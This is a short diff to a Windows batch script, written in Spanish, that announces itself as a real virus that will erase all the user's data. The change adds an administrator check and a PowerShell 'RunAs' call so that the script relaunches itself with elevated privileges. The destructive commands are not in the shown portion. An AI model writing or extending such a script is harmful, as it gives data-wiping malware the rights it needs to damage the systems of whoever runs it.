@@ -1,6 +1,14 @@
 @echo off
 color 0f
 
+:: Comprobación de si se está ejecutando como administrador.
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo ERROR: Esta programa necesita ejecutarse como administrador. Se te pedirá que lo ejecutes como administrador.
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit
+)
+
 :: 1. Mensaje de advertencia inicial
 echo   ADVERTENCIA: Estas a punto de ejecutar un
 echo   virus de verdad esto borrara todos tus datos
